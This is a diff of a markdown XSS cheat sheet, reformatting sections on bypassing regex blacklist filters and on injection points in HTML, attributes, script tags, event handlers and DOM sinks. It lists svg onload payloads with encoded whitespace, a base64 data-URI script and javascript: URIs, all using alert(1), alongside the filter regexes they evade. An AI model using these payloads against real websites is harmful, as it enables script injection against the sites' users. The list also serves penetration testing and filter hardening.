@@ -125,29 +125,19 @@ https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot
 
 ### Regex Blacklist Filtering
 
-(on\w+\s*=)
-```
-<svc/onload=alert(1)>
+(on\w+\s*=)  
+`<svc/onload=alert(1)>`  
+`<svg//////onload=alert(1)>`  
+`<svg id=x;onload=alert(1)>`   
+`<svg id=\`x\`onload=alert(1)>` 
 
-<svg//////onload=alert(1)>
+(?i)([\s\"'`;\/0-9\=]+on\w+\s*=)  
+`<svg onload%09=alert(1)>`  
+`<svg %09onload=alert(1)>`   
+`<svg %09onload%20=alert(1)>` 
+`<svg onload%09%20%28%2C%3B=alert(1)>`  
+`<svg onload%0B=alert(1)>`  
 
-<svg id=x;onload=alert(1)>
-  
-<svg id=\`x\`onload=alert(1)>
-``` 
-
-(?i)([\s\"'`;\/0-9\=]+on\w+\s*=)
-```  
-<svg onload%09=alert(1)>
-  
-<svg %09onload=alert(1)>
-  
-<svg %09onload%20=alert(1)>
-  
-<svg onload%09%20%28%2C%3B=alert(1)>
-  
-<svg onload%0B=alert(1)>
-```
 ### Keyword Based in Filter
  
 #### Alert Blocked - Bypass
@@ -195,7 +185,7 @@ Add execution sink for execution:
 ```
 <div>here</div>
 ```
--> 
+->  
 `<svg/onload=alert(1)`
 
 #### HTML Tag Attributes
@@ -204,7 +194,7 @@ Add execution sink for execution:
 <input value="here"/></input>
 ```
  
--> 
+->  
 `adaa"> <a/href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTs8L3NjcmlwdD4=">show</!--`
   
 #### Script Tag
@@ -215,14 +205,14 @@ Add execution sink for execution:
 </script>
 ```
   
-->
+->  
 `;alert(1);//`
 
 #### Event Attributes
 
 `<button onclick="reserve(here);">Okay!</button>`
 
--> 
+->  
 `alert(1)`
 
 Dom Based
@@ -231,7 +221,7 @@ Dom Based
 <script>var ok = location.search.replace("?ok=", "");domE1.innerHTML = "<a href=\'"+ok+"\'>ok</a>";</script>
 ```
   
-->
+->  
 `javascript:alert(1)`
 
 ### JavaScript Encoding and Compressor:
